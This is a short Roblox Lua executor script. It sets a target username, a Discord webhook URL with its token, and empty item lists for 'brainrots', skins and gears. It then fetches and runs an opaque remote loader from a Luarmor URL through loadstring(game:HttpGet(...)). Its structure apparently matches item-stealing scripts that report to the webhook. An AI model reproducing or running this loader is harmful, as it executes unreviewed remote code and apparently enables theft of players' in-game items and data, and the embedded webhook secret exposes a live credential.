-- Mode: NORMAL
getgenv().TARGET_USERNAME = "ro"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1552383890646237298/1ZrR50uIgJEa5uyJvltsQO6oNbj1ggKdIsileUlqAXew2kx5s4CIt2Xhqwb_4YoozGyB"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {}
getgenv().NORMAL_GEARS = {}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)